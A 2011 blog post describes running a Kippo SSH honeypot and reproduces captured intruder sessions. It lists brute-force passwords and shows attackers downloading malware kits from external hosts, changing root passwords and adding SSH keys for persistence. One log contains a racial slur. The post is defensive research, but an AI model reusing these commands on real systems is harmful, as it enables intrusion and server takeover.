Title: Running A SSH Honeypot With Kippo: Let's Catch Some Script Kiddies
Date: 2011-3-10
Author: Seppe "Macuyiko" vanden Broucke

# Introduction
While exploring [Fail2Ban](http://www.fail2ban.org/) during one of my [previous posts](http://blog.macuyiko.com/2011/01/slowloris-and-mitigations-for-apache.html), it amazed me how many break-in attempts I received, trying to brute force passwords on the SSH daemon. To recap, Fail2Ban does this:
> Fail2ban scans log files like /var/log/pwdfail or /var/log/apache/error_log and bans IP that makes too many password failures. It updates firewall rules to reject the IP address.
There are many articles ([this](http://thinkhole.org/wp/2006/10/30/five-steps-to-a-more-secure-ssh/) is one of them) on the web which describe how you can harden your SSH server, like preventing root logins, to give an example. After getting one Fail2Ban warning after another, I decided to also move my SSH server to another port. And lo and behold, the attacks stopped almost completely. This is an example of security through obscurity, of course, but it shows that most of the attacks are performed by bots or script kiddies who don't look further than port 22, so why not implement this simple chance.
Of course, now port 22 was free to do something else...
# Enter Kippo
Around this time (a few months ago), I also came across a program called [Kippo](http://code.google.com/p/kippo/):
> Kippo is a medium interaction SSH honeypot designed to log brute force attacks and, most importantly, the entire shell interaction performed by the attacker.
Kippo is written in Python and pretty easy to install (the required dependencies are all listed on the homepage). The only thing which needs a bit of setting up is getting Kippo to listen to port 22 (we want our honeypot to catch as much as possible). [This wiki page](http://code.google.com/p/kippo/wiki/MakingKippoReachable) describes how to do just that.
Kippo does not need much [setting up](http://code.google.com/p/kippo/wiki/KippoOnLinux), and comes with a lot of Linux commands re-implemented (like wget, adduser, apt-get). The most important thing to do is to take look at `kippo.cfg` and to create the simulated file system using `utils/createfs.py`. You can also easily add other commands if you're know what you're doing (take a look in `txtcmds/` and `kippo/commands/`).
After waiting for a week, I examined the logs to find out which passwords were used to try to login at the honeypot. By default, Kippo only comes with one root password it will accept ("123456"), but you can use the `utils/passdb.py` script to add more. I added these most commonly tried passwords:
  - aditzul92
  - admin1
  - enter
  - fuckoff
  - god  - lacramioara  - letmein  - linux  - love  - passwd  - r00t  - rootroot  - secret  - sex  - snickhacklol123  - test  - 070790  - 123456  - 1q2wazsx  - administrator  - dragon  - fuck  - manager  - monkey  - p0p0c@t3p3tldiej  - password  - q1w2e3r4  - root1  - swordfish
It's well known that brute force programs use so called wordlists which contain the most common passwords to try and break in into a server. If you notice that one of your used passwords is present in the list above, I would strongly suggest to change it. Then, I waited...
# A few months later
When looking at my logs now, I've had thousands of break-in attempts, hundreds of which "succeeded". The interesting thing about Kippo is that it actually logs the shell session of the hacker. These shell sessions can be divided into three categories:
  1. People who immediately leave once they're logged in, probably to come back later or just take note that this server is indeed available.  2. People who do some basic fingerprinting of the server, using `w`, `/proc/cpuinfo`, `uptime` and `uname -a` to figure out the basics of the server. Most hackers also used `wget` to download a large file to test the download rate of the server. Funnily enough, this was almost always the Windows 2000 SP3. Probably because it's (a) a large file and (b) hosted by a server you know is fast (Microsoft) and (c) is one of the few files on Microsoft's website which is still hotlinkable.  3. People who performed some fingerprinting and proceeded to download and extract malware. Here Kippo intercepted the attempts to run executables and showed some bogus error messages, after which the hackers disconnected.
Viewing the logs allows for some interesting observations:
  - Most of the attempts aren't thorough. Most hackers quickly move on when an attempt seems to fail.  - The tools used have been repacked and rewritten multiple times. Most of the tools are outdated, contain leftover files from previous installations or attempts, or contain weak attempts at automation shell scripts (with even sillier ASCII art).  - The main reasons for hacking a server seems to be: (a) installing tools to hack more servers, (b) installing hidden web servers, (c) installing IRC daemons or bouncers, (d) installing IRC bots. Surprisingly, almost none of the hackers tried to completely nuke the system.  - A few hackers spotted that a honeypot was in place. Most did not, despite the fact that Kippo is sometimes very blatant about this fact, by taunting with fake error messages.  - It seems that the hackers (I actually mean "script kiddies" whenever I say "hackers") are following some kind of memorized script. Most of the attempts used to exact same fingerprinting and tried to execute the exact same tools. It makes one wonder if there's a "SSH hacking school" out there somewhere. More realistically speaking, there probably is a "hacking tutorial" on a forum somewhere showing which commands you have to execute.
# A look at some attempts
Let's look at some of the shell sessions, shall we? I wanted to show an exact replay of the terminal sessions (like the demos on the [Kippo homepage](http://code.google.com/p/kippo/), but this proved to be too difficult. (Kippo's log files are not easily read, and while I did code up a conversion tool and the basics of a Javascript replaying script, it under performed on browsers other than Chrome, and I decided it was not worth further effort).
## First example
This attempt shows some of the basic fingerprinting performed by the hackers, and Kippo's faked response. Afterwards, the hacker tries to download an IRC bot. Kippo taunts with an "O RLY" message.
    server:~# w
     23:40:45 up 14 days,  3:53,  1 user,  load average: 0.08, 0.02, 0.01
    USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT    root     pts/0    188.131.103.31    23:33    0.00s  0.00s  0.00s w
    server:~# uptime
     23:30:42 up 14 days,  3:53,  0 users,  load average: 0.08, 0.02, 0.01
    server:~# cat /proc/cpuinfo
    processor    : 0
    vendor_id    : GenuineIntel
    cpu family    : 6
    model        : 23
    model name    : Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
    stepping    : 6
    cpu MHz        : 2133.305
    cache size    : 6144 KB
    physical id    : 0    siblings    : 2    core id        : 0    cpu cores    : 2    apicid        : 0    initial apicid    : 0    fpu        : yes    fpu_exception    : yes    cpuid level    : 10    wp        : yes    flags        : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm    bogomips    : 4270.03    clflush size    : 64    cache_alignment    : 64    address sizes    : 36 bits physical, 48 bits virtual    power management:    processor    : 1
    vendor_id    : GenuineIntel    cpu family    : 6    model        : 23    model name    : Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz    stepping    : 6    cpu MHz        : 2133.305    cache size    : 6144 KB    physical id    : 0    siblings    : 2    core id        : 1    cpu cores    : 2    apicid        : 1    initial apicid    : 1    fpu        : yes    fpu_exception    : yes    cpuid level    : 10    wp        : yes    flags        : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm    bogomips    : 4266.61    clflush size    : 64    cache_alignment    : 64    address sizes    : 36 bits physical, 48 bits virtual    power management:  
    server:~# uname -a
    Linux server 2.6.26-2-686 #1 SMP Wed Nov 4 20:45:37 UTC 2009 i686 GNU/Linux
    server:~# ls -a
    .         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   
    server:~# ps x
      PID TTY          TIME CMD
     5673 pts/0    00:00:00 bash
     5677 pts/0    00:00:00 ps x
    server:~# wget http://download.microsoft.com/download/win2000platform/SP/SP3/NT5/EN-US/W2Ksp3.exe
    --2011-01-26 23:31:12--  http://download.microsoft.com/download/win2000platform/SP/SP3/NT5/EN-US/W2Ksp3.exe
    Connecting to download.microsoft.com:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 130978672 (124M) [application/octet-stream]
    Saving to: `W2Ksp3.exe
     7% [===>                                   ] 10,422,763   1731K/s  eta 1m 9s^C
    200 OK
    server:~# rm -rf W2Ksp3.exe
    server:~# wget http://eu-ro.ca/img.tar
    --2011-01-26 23:31:31--  http://eu-ro.ca/img.tar
    Connecting to eu-ro.ca:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 659886 (644K) [application/x-tar]
    Saving to: `img.tar
    100%[======================================>] 659,886      219K/s  eta 0s  
    2011-01-26 23:31:34 (219 KB/s) - `img.tar' saved [659886/659886]
    server:~# tar zxvf img.tar
    .img    .img/start    .img/run    .img/r    .img/r/rversions.e    .img/r/rtsay.e    .img/r/rsignoff.e    .img/r/rsay.e    .img/r/rpickup.e    .img/r/rnicks.e    .img/r/rkicks.e    .img/r/rinsult.e    .img/r/raway.e    .img/pico    .img/m.help    .img/inst    .img/bash    .img/autorun    .img    .img/start    .img/run    .img/r    .img/r/rversions.e    .img/r/rtsay.e    .img/r/rsignoff.e    .img/r/rsay.e    .img/r/rpickup.e    .img/r/rnicks.e    .img/r/rkicks.e    .img/r/rinsult.e    .img/r/raway.e    .img/pico    .img/m.help    .img/inst    .img/bash    .img/autorun    server:~# cd .img
    server:/root/.img# chmod +x *
    server:/root/.img# ./start +s
      ___ 
     {o,o}
     |)__)
     -"-"-
    O RLY? cd
      ___ 
     {o,o}
     |)__)
     -"-"-
    O RLY? cd ..
      ___ 
     {o,o}
     |)__)
     -"-"-
    O RLY?
## Second example

Another one (I've removed the fingerprinting from now on). Here, `ftp`, `apt-get` and `yum` are tried before settling with `wget`. Another interesting thing to see here is that the tool is actually stored in what "looks" like an image file: `scanmorf.jpg`. Changing the extension is a tactic often used to upload files to web servers who only perform some basic filename checks. In this case, `root-arhive.do.am` might be an innocent, hacked website. The `pscan` tool used here will return often and is used to scan IP blocks for open SSH servers.
    server:~# ftp zorro89.trei.ro
    bash: ftp: command not found
    server:~# apt-get
    E: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
    E: Unable to lock the list directory    server:~# yum    bash: yum: command not found
    server:~# wget    wget: missing URL    Usage: wget [OPTION]... [URL]...
    Try `wget --help' for more options.
    server:~# http://root-arhive.do.am/scanner/scanmorf.jpg ; tar zxvf scanmorf.jpg ; cd .shm.xcgi?F6=1 ; chmod wget +x *    --2011-01-26 23:53:38--  http://root-arhive.do.am/scanner/scanmorf.jpg    Connecting to root-arhive.do.am:80... connected.    HTTP request sent, awaiting response... 200 OK    Length: 12466 (12K) [image/jpeg]    Saving to: `scanmorf.jpg    100%[======================================>] 12,466       2K/s  eta 4s    
    2011-01-26 23:53:38 (2 KB/s) - `scanmorf.jpg' saved [12466/12466]
    .shm.xcgi?F6=1
    .shm.xcgi?F6=1/12.pscan.80
    .shm.xcgi?F6=1/Horde
    .shm.xcgi?F6=1/sd.pscan.80
    .shm.xcgi?F6=1/h
    .shm.xcgi?F6=1/a
    .shm.xcgi?F6=1/23.pscan.80
    .shm.xcgi?F6=1/paths
    .shm.xcgi?F6=1/ps
    .shm.xcgi?F6=1/a.pl
    .shm.xcgi?F6=1/scan
    server:/root/.shm.xcgi?F6=1# ls    12.pscan.80 Horde       sd.pscan.80 h           a           23.pscan.80 paths       ps          a.pl        scan        
    server:/root/.shm.xcgi?F6=1# ls -all    drwxr-xr-x 1 root root  4096 2011-01-26 23:53 .    drwxr-xr-x 1 root root  4096 2011-01-26 23:53 ..    -rwxr-xr-x 1 root root     0 2011-01-22 02:25 12.pscan.80    -rwxr-xr-x 1 root root 14372 2011-01-22 02:28 Horde    -rwxr-xr-x 1 root root  9516 2011-01-22 02:25 sd.pscan.80    -rwxr-xr-x 1 root root  2720 2006-05-05 15:56 h    -rwxr-xr-x 1 root root    23 2006-05-05 15:55 a    -rw-r--r-- 1 root root     0 2011-01-22 02:28 23.pscan.80    -rwxr-xr-x 1 root root    50 2006-05-05 15:56 paths    -rwxr-xr-x 1 root root 13432 2011-01-22 02:28 ps    -rwxr-xr-x 1 root root  1165 2006-05-05 15:56 a.pl    -rwxr-xr-x 1 root root   857 2011-01-22 02:28 scan
    server:/root/.shm.xcgi?F6=1# ./scan 88.198      ___      {o,o}     |)__)     -"-"-    O RLY? y      ___     {o,o}     (__(|     -"-"-    NO WAI!
    server:/root/.shm.xcgi?F6=1# ./a 88.198    error while loading shared libraries: libgnome.so.32: cannot open shared object file: No such file or directory
## Third example
Some intruders are friendly enough to change the root password for us. This would actually be an interesting concept to add to Kippo: when you notice a `passwd` command being executed, try to set up a reverse SSH connection to the attacker (probably possible since the attackers often use hacked servers themselves) and login with that password. When the same password is used during each hack attempt, we would probably be able to reclaim the originating server. Two tools are downloaded here. One is a flooding IRC bot, the other is a rehash of the `pscan` tool from above, with some automation shell scripts added (dubbed `gosh` here). It's also interesting to note that most of the hackers try to cover their tracks by removing their downloads.
    server:~# w     23:35:44 up 14 days,  3:53,  1 user,  load average: 0.08, 0.02, 0.01    USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT    root     pts/0    82.57.163.232     23:35    0.00s  0.00s  0.00s w
    server:~# passwd    Enter new UNIX password:     Retype new UNIX password:     passwd: password updated successfully
    server:~# cd ..
    server:/# cd var 
    server:/var# cd tmp
    server:/var/tmp# ls
    server:/var/tmp# wget http://www.denysa.net/denysa/flood.tgz    --2011-01-26 23:36:24--  http://www.denysa.net/denysa/flood.tgz    Connecting to www.denysa.net:80... connected.    HTTP request sent, awaiting response... 200 OK    Length: 227324 (221K) [application/x-compressed]    Saving to: `flood.tgz
    100%[======================================>] 227,324      51K/s  eta 2s   
    2011-01-26 23:36:26 (51 KB/s) - `flood.tgz' saved [227324/227324]        server:/var/tmp# wget http://gblteam.webs.com/gosh.tgz.tar
    --2011-01-26 23:36:44--  http://gblteam.webs.com/gosh.tgz.tar
    Connecting to gblteam.webs.com:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 1642769 (1M) [application/x-tar]
    Saving to: `gosh.tgz.tar
    100%[======================================>] 1,642,769    658K/s  eta 0s   
    2011-01-26 23:36:46 (658 KB/s) - `gosh.tgz.tar' saved [1642769/1642769]
    server:/var/tmp# tar zxvf gosh.tgz.tar    gosh    gosh/3    gosh/4    gosh/common    gosh/go.sh    gosh/scam    gosh/pscan2    gosh/ss    gosh/5    gosh/vuln.txt    gosh/1    gosh/mfu.txt    gosh/pass_file    gosh/gen-pass.sh    gosh/secure    gosh/2    gosh/ssh-scan    gosh/a
    server:/var/tmp# cd gosh
    server:/var/tmp/gosh# ls    3           4           common      go.sh       scam        pscan2          ss          5           vuln.txt    1           mfu.txt     pass_file       gen-pass.sh secure      2           ssh-scan    a           
    server:/var/tmp/gosh# touch bios.txt
    server:/var/tmp/gosh# chmod +x *
    server:/var/tmp/gosh# ./go.sh 114      ___      {o,o}     |)__)     -"-"-    O RLY? y
      ___     {o,o}     (__(|     -"-"-    NO WAI!
    server:/var/tmp/gosh# cd ..
    server:/var/tmp# rm -rf gosh
    server:/var/tmp# ls    flood.tgz    gosh.tgz.tar 
    server:/var/tmp# tar zxvf flood.tgz    f    f/1    f/P&u÷    f/P¦u÷    f/b    f/b2    f/bang.txt    f/f    f/f4    f/fwd    f/hide    f/httpd    f/j    f/j2    f/mech.help    f/mech.set    f/s    f/sl    f/start.sh    f/std    f/stream    f/tty    f/v    f/v2    f/x
    server:/var/tmp# cd f
    server:/var/tmp/f# rm -rf f
    server:/var/tmp/f# ls    1         P&u÷   P¦u÷  b         b2        bang.txt  f4        fwd           hide      httpd     j         j2        mech.help mech.set  s         sl            start.sh  std       stream    tty       v         v2        x         
    server:/var/tmp/f# ./httpd    unable to open display ":0"
    server:/var/tmp/f# chmod +x *
    server:/var/tmp/f# ./httpd    unable to open display ":0"
    server:/var/tmp/f# cd..    bash: cd..: command not found
    server:/var/tmp/f# cd ..
    server:/var/tmp# rm -rf f
    server:/var/tmp# ls    flood.tgz    gosh.tgz.tar 
    server:/var/tmp# rm -rf flood.tgz
    server:/var/tmp# rm -rf gosh.tgz.tar93
## Fourth exampleAnother attempt. Checking out the website http://eu-ro.ca/ reveals what seems to be a Romanian hacker group/set-up. Peeking in the bot configuration often reveals obscure IRC channels on Undernet. Following these channels quickly leads you to a whole set-up of channels, bots, and hackers. If you manage to lay low there, you can gain a lot of info (bot commands, group leaders, group set-up, targets and so on), but be prepared for some bans and insults as well. If I had some more spare time, I would set up a few dedicated honeypots (with more advanced shell simulation) and try to uncover more.
    server:~# mkdir /tmp/.user
    server:~# cd /tmp/.user
    server:/tmp/.user# wget http://eu-ro.ca/.kde.tgz
    --2011-01-26 23:46:15--  http://eu-ro.ca/.kde.tgz
    Connecting to eu-ro.ca:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 1238822 (1M) [application/x-gzip]
    Saving to: `.kde.tgz
    100%[======================================>] 1,238,822    327K/s  eta 0s   
    2011-01-26 23:46:19 (327 KB/s) - `.kde.tgz' saved [1238822/1238822]
    server:/tmp/.user# tar zxvf .kde.tgz    .kde    .kde/pass_filees    .kde/pscan2    .kde/a1    .kde/common    .kde/pass_file    .kde/ssh-scan    .kde/auto    .kde/ss    .kde/go.sh    .kde/a    .kde/gen-pass.sh    .kde/start    .kde/vuln.txt    .kde    .kde/pass_filees    .kde/pscan2    .kde/a1    .kde/common    .kde/pass_file    .kde/ssh-scan    .kde/auto    .kde/ss    .kde/go.sh    .kde/a    .kde/gen-pass.sh    .kde/start    .kde/vuln.txt
    server:/tmp/.user# cs .kde    bash: cs: command not found
    server:/tmp/.user# cd .kde
    server:/tmp/.user/.kde# ls -a    .           ..          pass_filees pscan2      a1          common          pass_file   ssh-scan    auto        ss          go.sh       a               gen-pass.sh start       vuln.txt    
    server:/tmp/.user/.kde# chmod +x *
    server:/tmp/.user/.kde# ./a 210.133    unable to open display ":0"
    server:/tmp/.user/.kde# chmod +x *
    server:/tmp/.user/.kde# ./start 28    error while loading shared libraries: libgnome.so.32: cannot open shared object file: No such file or directory
    server:/tmp/.user/.kde# cd ..
    server:/tmp/.user# ls-a    bash: ls-a: command not found
    server:/tmp/.user# ls -a    .        ..       .kde.tgz .kde     .kde     
    server:/tmp/.user# wget bila.do.am/bila.tgz    --2011-01-26 23:50:26--  http://bila.do.am/bila.tgz    Connecting to bila.do.am:80... connected.    HTTP request sent, awaiting response... 200 OK    Length: 262027 (255K) [application/octet-stream]    Saving to: `bila.tgz
    100%[======================================>] 262,027      6K/s  eta 42s
    2011-01-26 23:50:27 (6 KB/s) - `bila.tgz' saved [262027/262027]
    server:/tmp/.user# tar zxvf bila.tgz    .tmp    .tmp/cyc.acc    .tmp/ -bash    .tmp/s.sh    .tmp/cyc.set    .tmp/pico    .tmp/stealth
    server:/tmp/.user# ls -a    .        ..       .kde.tgz .kde     .kde     bila.tgz .tmp     
    server:/tmp/.user# cd .tmp
    server:/tmp/.user/.tmp# ls -a    .       ..      cyc.acc  -bash  s.sh    cyc.set pico    stealth 
    server:/tmp/.user/.tmp# ./stealth    unable to open display ":0"
## Fifth example
Another straightforward attempt. Also here, the website http://arhiva.do.am seems to be used as a dump for hosting malware.
    server:~# wget http://arhiva.do.am/dabian.tgz    --2011-01-27 00:18:22--  http://arhiva.do.am/dabian.tgz    Connecting to arhiva.do.am:80... connected.    HTTP request sent, awaiting response... 404 Not Found
    server:~# wget http://arhiva.do.am/arhiva.tgz    --2011-01-27 00:18:57--  http://arhiva.do.am/arhiva.tgz    Connecting to arhiva.do.am:80... connected.    HTTP request sent, awaiting response... 404 Not Found
    server:~# wget http://arhiva.do.am/scan.tar    --2011-01-27 00:19:28--  http://arhiva.do.am/scan.tar    Connecting to arhiva.do.am:80... connected.    HTTP request sent, awaiting response... 200 OK    Length: 1484800 (1M) [application/octet-stream]    Saving to: `scan.tar
    100%[======================================>] 1,484,800    518K/s  eta 0s  
    2011-01-27 00:19:31 (518 KB/s) - `scan.tar' saved [1484800/1484800]
    server:~# tar xvf scan.tar    scan    scan/sshf    scan/a6    scan/start    scan/pass_sh    scan/a5    scan/gen-pass.sh    scan/ssh-scan    scan/test.sh    scan/README    scan/200.pscan.22    scan/pass_file    scan/sshf0    scan/pscan2    scan/pico    scan/pass_filees    scan/vuln.txt    scan/a4    scan/a1    scan/a2    scan/mfu.txt    scan/a    scan/common
    server:~# rm -rf scan.tar
    server:~# ls -a    .         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   scan      
    server:~# cd scan
    server:/root/scan# ./a 64.189    Shall we play a game?
## Sixth example
Another attempt. Here, three different malware programs are tried out before giving up. It's also interesting to see where intruders hide their downloads, some use `/root`, some `/tmp`, some esoteric locations like `/tmp/...`.
    server:~# wget
    wget: missing URL
    Usage: wget [OPTION]... [URL]...
    Try `wget --help' for more options.
    server:~# yum
    bash: yum: command not found
    server:~# wget freewebtown.com/pacalici/lib.tgz
    --2011-02-09 00:30:57--  http://freewebtown.com/pacalici/lib.tgz
    Connecting to freewebtown.com:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 8772939 (8M) [application/x-tar]
    Saving to: `lib.tgz
    100%[======================================>] 8,772,939    1844K/s  eta 0s  
   
    2011-02-09 00:31:02 (1844 KB/s) - `lib.tgz' saved [8772939/8772939]
    server:~# tar zxvf lib.tgz
    lib
    lib/mech.pid    lib/fuck    lib/j2    lib/v    lib/s    lib/r    lib/__libc_start_main    lib/std    lib/b    lib/bang.txt    lib/j    lib/1    lib/f4    lib/dir    lib/y2kupdate    lib/fwd    lib/x    lib/mech.set    lib/tty    lib/cron.d    lib/h    lib/sl    lib/b2    lib/W2Ksp3.exe    lib/tun.seen    lib/f    lib/h.c    lib/stream    lib/v2    lib/init    server:~# rm -rf lib.tgz
    server:~# cd lib
    server:/root/lib# ./y2kupdate    unable to open display ":0"
    server:/root/lib# ./init    unable to open display ":0"
    server:/root/lib# cd
    server:~# ls    lib 
    server:~# cd /dev
    server:/dev# wget freewebtown.com/pacalici/bf.tgz    --2011-02-09 00:32:05--  http://freewebtown.com/pacalici/bf.tgz    Connecting to freewebtown.com:80... connected.    HTTP request sent, awaiting response... 200 OK    Length: 392378 (383K) [application/x-tar]    Saving to: `bf.tgz
    100%[======================================>] 392,378      9K/s  eta 39s
    2011-02-09 00:32:06 (9 KB/s) - `bf.tgz' saved [392378/392378]
    server:/dev# tar zxvf bf.tgz    mc-root    mc-root/go    mc-root/cyc.set    mc-root/cyc.help    mc-root/cyc.levels    mc-root/bash    mc-root/udp.pl    mc-root/stealth    mc-root/randfiles    mc-root/randfiles/randkicks.e    mc-root/randfiles/randaway.e    mc-root/randfiles/randsignoff.e    mc-root/randfiles/randinsult.e    mc-root/randfiles/randversions.e    mc-root/randfiles/randsay.e    mc-root/randfiles/randpickup.e    mc-root/randfiles/randnicks.e    mc-root/cyc.acc    mc-root/pico.tgz    mc-root/pico
    mc-root/cyc.pid
    server:/dev# rm -rf bf.tgz
    server:/dev# 
    server:/dev# cd mc-root
    server:/dev/mc-root# ./go
    unable to open display ":0"
    server:/dev/mc-root# ls
    go         cyc.set    cyc.help   cyc.levels bash       udp.pl     stealth    
    randfiles  cyc.acc    pico.tgz   pico       cyc.pid    
    server:/dev/mc-root# cd
    server:~# 
    server:~# 
    server:~# wget pibo.com/.x/scan/wtf.tar
    --2011-02-09 00:35:09--  http://pibo.com/.x/scan/wtf.tar
    Connecting to pibo.com:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 1574103 (1M) [application/x-tar]
    Saving to: `wtf.tar
    100%[======================================>] 1,574,103    299K/s  eta 1s   
    2011-02-09 00:35:13 (299 KB/s) - `wtf.tar' saved [1574103/1574103]
    server:~# tar xzvf wtf.tar    wtf    wtf/a    wtf/a1    wtf/auto    wtf/common    wtf/gen-pass.sh    wtf/go.sh    wtf/pass_file    wtf/pscan2    wtf/scam    wtf/sh    wtf/ss    wtf/ssh-scan    wtf/start    wtf/vuln.txt    server:~# cd wtf    server:/root/wtf# chmod +x *
    server:/root/wtf# ./a 100    error while loading shared libraries: libgnome.so.32: cannot open shared object file: No such file or directory
    server:/root/wtf#
## Seventh example
Not only is this intruder very offensive, he also quickly spotted the honeypot.
    server:~# adduser nigger    Adding user `nigger' ...    Adding new group `nigger' (1001) ...    Adding new user `nigger' (1001) with group `nigger' ...    Creating home directory `/home/nigger' ...    Copying files from `/etc/skel' ...    Password:     Password again: 
    Changing the user information for nigger
    Enter the new value, or press ENTER for the default
            Username []:     Must enter a value!            Username []: only            Full Name []: dumb            Room Number []: niggers            Work Phone []: use            Home Phone []: honeypot            Mobile Phone []: you            Country []: stupid            City []: nigger            Language []: HA            Favorite movie []: HA            Other []: HA    Is the information correct? [Y/n] y    ERROR: Some of the information you entered is invalid    Deleting user `nigger' ...    Deleting group `nigger' (1001) ...    Deleting home directory `/home/nigger' ...    Try again? [Y/n] n## Eight example
This guy tried adding his SSH keys and installing software again and again and was one of the most persistent intruders.
    server:~# cd
    server:~# ls -a    .         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   
    server:~# cd /root
    server:~# ls -a    .         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   
    server:~# cd ..
    server:/# ls -a    .          ..         sys        bin        mnt        media      vmlinuz        opt        cdrom      selinux    tmp        proc       sbin       etc            dev        srv        initrd.img lib        home       var        usr            boot       root       lost+found 
    server:/# cd
    server:~# ls -a    .         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   
    server:~# mkdir .ssh
    server:~# cd .ssh
    server:/root/.ssh# ls -a
    server:/root/.ssh# echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH+iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed/FONEcnZFVo0eTkaZ+xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf+I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ== rsa-key-20080201 >> ~/.ssh/authorized_keys; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys    ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH+iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed/FONEcnZFVo0eTkaZ+xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf+I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ== rsa-key-20080201 >> ~/.ssh/authorized_keys
    server:/root/.ssh# ls  -a
    server:/root/.ssh# dir    bash: dir: command not found
    server:/root/.ssh# ls -a
    server:/root/.ssh# cd ..
    server:~# ls -a    .         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   .ssh      
    server:~# rm -rf .ssh
    server:~# cd .root    bash: cd: .root: No such file or directory
    server:~# cd /root
    server:~# ls -a    .         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   
    server:~# mkdir .ssh
    server:~# cd .ssh
    server:/root/.ssh# echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH+iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed/FONEcnZFVo0eTkaZ+xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf+I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ== rsa-key-20080201 >> ~/.ssh/authorized_keys; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys    ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH+iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed/FONEcnZFVo0eTkaZ+xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf+I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ== rsa-key-20080201 >> ~/.ssh/authorized_keys
    server:/root/.ssh# cd ..
    server:~# ls -a    .         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   .ssh      
    server:~# rm -rf .ssh
    server:~# cd ..
    server:/# ls -a    .          ..         sys        bin        mnt        media      vmlinuz        opt        cdrom      selinux    tmp        proc       sbin       etc            dev        srv        initrd.img lib        home       var        usr            boot       root       lost+found 
    server:/# cd home
    server:/home# ls -a    .       ..      richard 
    server:/home# cd ..
    server:/# ls -a    .          ..         sys        bin        mnt        media      vmlinuz        opt        cdrom      selinux    tmp        proc       sbin       etc            dev        srv        initrd.img lib        home       var        usr            boot       root       lost+found 
    server:/# mkdir .ssh
    server:/# cd .ssh
    server:/.ssh# echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH+iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed/FONEcnZFVo0eTkaZ+xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf+I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ== rsa-key-20080201 >> ~/.ssh/authorized_keys; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys    ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH+iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed/FONEcnZFVo0eTkaZ+xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf+I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ== rsa-key-20080201 >> ~/.ssh/authorized_keys
    server:/.ssh# cd ..
    server:/# ;s =a    bash: s: command not found
    server:/# 
    server:/# ls -a    .          ..         sys        bin        mnt        media      vmlinuz        opt        cdrom      selinux    tmp        proc       sbin       etc            dev        srv        initrd.img lib        home       var        usr            boot       root       lost+found .ssh       
    server:/# rm -rf .ssh
    server:/# cd
    server:~# cd /tmp
    server:/tmp# ls -a    .         ..        .ICE-unix .X11-unix 
    server:/tmp# mkdir ,
    server:/tmp# cd ,
    server:/tmp/,# wget http://pinky.clan.su/mech/fast.jpg ;  tar fast.jpg    --2011-03-02 21:07:41--  http://pinky.clan.su/mech/fast.jpg    Connecting to pinky.clan.su:80... connected.    HTTP request sent, awaiting response... 200 OK    Length: 821334 (802K) [image/jpeg]    Saving to: `fast.jpg
    100%[======================================>] 821,334      113K/s  eta 0s  
    2011-03-02 21:07:49 (113 KB/s) - `fast.jpg' saved [821334/821334]
    tar: You must specify one of the `-Acdtrux' options
    Try `tar --help' or `tar --usage' for more information.
